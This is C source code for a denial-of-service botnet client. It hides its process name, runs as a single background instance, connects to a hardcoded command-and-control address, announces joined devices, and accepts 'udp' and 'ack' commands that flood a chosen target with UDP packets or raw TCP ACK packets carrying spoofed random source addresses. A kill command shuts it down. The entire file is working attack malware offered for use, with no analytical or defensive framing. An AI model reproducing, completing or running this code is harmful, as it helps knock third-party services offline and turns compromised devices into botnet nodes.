/* 
	UDP IP PORT TIME PSIZE // just good for devices without root 
	ACK IP PORT TIME PSIZE
*/
#include <stdlib.h>
#ifdef DBG
	#include <stdio.h>
#endif
#include <sys/socket.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>
#include <errno.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <sys/prctl.h>
#include <fcntl.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <time.h>

#include "csum.h"

#define INET_ADDR(o1,o2,o3,o4) (htonl((o1 << 24) | (o2 << 16) | (o3 << 8) | (o4 << 0)))
#define LOCALHOST (INET_ADDR(127,0,0,1))

fd_set write_set, read_set;
uint32_t LOCAL_ADDR;

static void ensure_bind(uint32_t bind_addr);
uint32_t util_local_addr(void);

enum
{
    FALSE,
	TRUE,
};

static struct settings
{
	char buffer[512];
	int fd;
	int status;
}bot;

static void udp_flood(unsigned char *arguments[])
{
	unsigned char *host = NULL;
	host = arguments[1];
	uint16_t port = atoi(arguments[2]); 
	int seconds = atoi(arguments[3]);
	uint16_t packetsize;

	if(arguments[4] == NULL)
		packetsize = 0;
	else
		packetsize = atoi(arguments[4]);
	
	int fd, end;
	struct sockaddr_in addr;
	char *payload = NULL;
	payload = (char*)malloc(packetsize);
	
	if(packetsize > 1024)
		packetsize = 1024;
	
	if(seconds > 10000)
		seconds = 10000; 
	
	// just to stop devices being raped ^
	
	fd = socket(AF_INET, SOCK_DGRAM, 0);
	#ifdef DBG
		printf("udp flood optimized; %s:%d seconds: %d size: %d \r\n", host, port, seconds, packetsize);
	#endif
	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = inet_addr(host);
	addr.sin_port = htons(port);
	
	connect(fd, (struct sockaddr*)&addr, sizeof(addr));
	
	end = time(NULL) + seconds;
	while(end > time(NULL))
	{
		payload[packetsize] = (char)(rand() % 0xffff);
		send(fd, payload, packetsize, MSG_NOSIGNAL);
	}
	
	close(fd);
	free(payload);
	#ifdef DBG
		printf("plain udp flood finished! \r\n");
	#endif
	_exit(0);
}

static void ack_flood(unsigned char *arguments[])
{
	unsigned char *host = NULL;
	host = arguments[1];
	uint16_t port = atoi(arguments[2]); 
	int seconds = atoi(arguments[3]);
	uint16_t packetsize;

	if(arguments[4] == NULL)
		packetsize = 0;
	else
		packetsize = atoi(arguments[4]);
	
	if(packetsize > 1024)
		packetsize = 1024;
	
	if(seconds > 10000)
		seconds = 10000; 
	
	// just to stop devices being raped ^
	
	struct sockaddr_in addr;
	int fd, end;
	uint8_t flag = 1;
	
	struct iphdr *iph;
	struct tcphdr *tcph;
	
	unsigned char rawpacket[sizeof(struct iphdr) + sizeof(struct tcphdr) + packetsize];
	iph = (struct iphdr *)rawpacket;
    tcph = (void *)iph + sizeof(struct iphdr);
	
	
	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = inet_addr(host);
	addr.sin_port = htons(port);
	
	fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
	
	if(setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &flag, sizeof (flag)) == -1)
	{
		#ifdef DBG
			printf("permission denied! user doesnt have access to raw sockets.\r\n");
		#endif
		_exit(0);
	}

	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0;
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + packetsize;
	iph->id = rand_int();
	iph->frag_off = 0;
	iph->ttl = MAXTTL;
	iph->protocol = IPPROTO_TCP;
	iph->check = 0;
	iph->saddr = rand_int();
	iph->daddr = addr.sin_addr.s_addr;
	
	tcph->source = rand_int();
	tcph->seq = rand_int();
	tcph->ack_seq = 0;
	tcph->window = rand_int();
	tcph->check = 0;
	tcph->urg_ptr = 0;
	tcph->dest = htons(port);
	tcph->check = tcpcsum(iph, tcph);
	iph->check = csum ((unsigned short *) rawpacket, iph->tot_len);
	tcph->doff = 5;
	tcph->ack = 1;
	#ifdef DBG
		printf("ack flood optimized; %s:%d seconds: %d size: %d \r\n", host, port, seconds, packetsize);
	#endif

	end = time(NULL) + seconds;
    while(end > time(NULL))
    {
        
        tcph->seq = rand_int();
        tcph->check = 0;
        tcph->check = tcpcsum(iph, tcph);
		
		iph->id = rand_int();
		iph->check = 0;
        iph->check = csum ((unsigned short *) rawpacket, iph->tot_len);
		
		sendto(fd, rawpacket, sizeof(rawpacket), 0, (struct sockaddr *)&addr, sizeof(addr));
    }
	
	close(fd);
	#ifdef DBG
		printf("ack tcp flood finished! \r\n");
	#endif	
	_exit(0);
}

static void command_parse(char *buf)
{
	uint8_t g = 0;
	uint8_t count = 0;
	unsigned char *argv[10 + 1] = { 0 };
	
	char *token = NULL;
	token = strtok(buf, " ");
	
	while(TRUE)
	{
		if (token == NULL || count >= 10)
                break;
		
		argv[count++] = (char*)malloc(strlen(token) + 1);
		strcpy(argv[count - 1], token);
		
		token = strtok(NULL, " ");
	}
	
    if (*argv == 0)
    {
        return;  
    }
	
	if(!strcmp(*argv, "udp"))
	{
		if(count < 3)
			return;
		if(!fork())
			udp_flood(argv);
		
		return;
	}
	
	if(!strcmp(*argv, "ack"))
	{
		if(count < 3) 
			return;
		if(!fork())
			ack_flood(argv);
		
		return;
	}
	
	for(g = 0; g < count; g++)
		free(argv[g]);
	
}

static int setup_fdsets(void) 
{
	FD_SET(bot.fd, &read_set);
	FD_SET(bot.fd, &write_set);
	
	int err = 0;
	struct timeval tv;
	tv.tv_sec = 10;
	tv.tv_usec = 0;

	if(select(bot.fd + 1, &read_set, &write_set, NULL, &tv) == -1)
	{
		return 0;
	}
	
	if(FD_ISSET(bot.fd, &write_set))
	{
		err = 0;
		socklen_t err_len = sizeof(err);

		getsockopt(bot.fd, SOL_SOCKET, SO_ERROR, &err, &err_len);
		if(err)
			return 0;
	}
	
	if(FD_ISSET(bot.fd, &read_set))
	{
		err = 0;
		socklen_t err_len = sizeof(err);

		getsockopt(bot.fd, SOL_SOCKET, SO_ERROR, &err, &err_len);
		if(err)
			return 0;
	}
	#ifdef DBG
		printf("[main] ready to read & write \r\n");
	#endif
	return 1;
}

int main(int argc, char *argv[])
{
	if(fork() > 0)
		return;
	
	prctl(PR_SET_NAME, " ");
	
	bot.fd = -1;
	bot.status = 0;
	
	chdir("/");
	
	LOCAL_ADDR = util_local_addr();
	
	signal(SIGCHLD, SIG_IGN);
	signal(SIGHUP, SIG_IGN);
	
	ensure_bind(LOCAL_ADDR);
	
	struct sockaddr_in addr;
	
	addr.sin_family = AF_INET;
    addr.sin_port = htons(2);
    addr.sin_addr.s_addr = INET_ADDR(81,7,7,10); // put your host here
	
	while(TRUE)
	{
		sleep(1);
		
		bot.fd = socket(AF_INET, SOCK_STREAM, 0);
		fcntl(bot.fd, F_SETFL, O_NONBLOCK | fcntl(bot.fd, F_GETFL, 0));
		connect(bot.fd, (struct sockaddr *)&addr, sizeof(addr));
		
		bot.status = setup_fdsets();
		switch(bot.status)
		{
			case FALSE:
			{
				#ifdef DBG
					printf("[main] failed \n");
				#endif
				break;
			}
			default:
			{
				char msg[512];
				#ifdef DBG
					printf("[main] Connected! \n");
				#endif
				strcpy(msg, "[Connection] - Device Joined: [");
				strcat(msg, argv[1]);
				strcat(msg, "] \r\n");
				send(bot.fd, msg, strlen(msg), MSG_NOSIGNAL);
				
				while(read(bot.fd, bot.buffer, sizeof(bot.buffer))) // reads untill disconnection
				{
					if(strlen(bot.buffer) > 3)
					{
						if(strstr(bot.buffer, "hahakillme"))
						{
							#ifdef DBG
								printf("Disconnected! \r\n");
							#endif
							close(bot.fd);
							kill(getppid(), 9);
							exit(0);
						}
						else
						{
							command_parse(bot.buffer);
						}
					}
					
					memset(bot.buffer, 0, sizeof(bot.buffer));
				}	
				break;
			}
		}
	}
	close(bot.fd);
}

static void ensure_bind(uint32_t bind_addr)
{
    int fd = -1;
    struct sockaddr_in addr;
    int ret = 0;
    int e = 0;

    fd = socket(AF_INET, SOCK_STREAM, 0);
    if(fd == -1)
    {
        return;
    }

    addr.sin_family = AF_INET;
    addr.sin_port = htons(8888); // change single instance port here 
    addr.sin_addr.s_addr = bind_addr;

    fcntl(fd, F_SETFL, O_NONBLOCK | fcntl(fd, F_GETFL, 0));

    errno = 0;

    ret = bind(fd, (struct sockaddr *)&addr, sizeof(addr));
    e = errno;

    if(ret == -1 && e == EADDRNOTAVAIL)
    {
        close(fd);
        sleep(1);
        ensure_bind(LOCALHOST);
        return;
    }

    if(ret == -1 && EADDRINUSE)
    {
    	#ifdef DBG
        	printf("Determined we already have a instance running on this system!\n");
        #endif
        exit(1);
    }

    listen(fd, 1);
    #ifdef DBG
    	printf("Binded and listening on address %d.%d.%d.%d\n", bind_addr & 0xff, (bind_addr >> 8) & 0xff, (bind_addr >> 16) & 0xff, (bind_addr >> 24) & 0xff);
    #endif
    return;
}

uint32_t util_local_addr(void)
{
    int fd;
    struct sockaddr_in addr;
    socklen_t addr_len = sizeof (addr);

    errno = 0;
    if ((fd = socket(AF_INET, SOCK_DGRAM, 0)) == -1)
    {
#ifdef DBG
        printf("[util] Failed to call socket(), errno = %d\n", errno);
#endif
        return 0;
    }

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INET_ADDR(8,8,8,8);
    addr.sin_port = htons(53);

    connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in));

    getsockname(fd, (struct sockaddr *)&addr, &addr_len);
    close(fd);
    return addr.sin_addr.s_addr;
}